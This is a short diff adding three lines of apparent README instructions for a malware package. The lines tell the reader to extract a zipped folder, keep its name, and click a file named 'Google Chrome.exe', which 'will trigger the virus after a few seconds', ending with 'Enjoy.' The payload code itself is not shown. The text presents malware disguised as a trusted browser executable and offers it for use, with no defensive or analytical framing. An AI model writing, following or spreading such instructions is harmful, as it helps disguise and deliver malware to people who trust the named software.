@@ -1,0 +1,3 @@
+Extract the zipped folder, take the Google Chrome.exe file and place it wherever you would like.
+Feel free to move the extracted folder wherever you would like but do not rename it. Click
+The Google Chrome file and it will trigger the virus after a few seconds. Enjoy.
